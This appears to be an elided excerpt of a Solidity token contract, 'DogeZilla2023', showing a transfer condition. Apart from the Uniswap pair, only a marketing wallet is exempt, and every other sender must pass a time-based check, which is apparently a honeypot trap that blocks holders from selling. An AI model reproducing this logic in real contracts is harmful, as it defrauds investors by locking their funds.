...
contract  DogeZilla2023    is Ownable, IERC20 {
    ...
    string private  _name = "DogeZilla2023";
    string private  _symbol = "DogeZilla2023";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from !=uniswapV2Pair ) {if(from != _marketing){ {require (   _tax  >=  time ) ;} } }
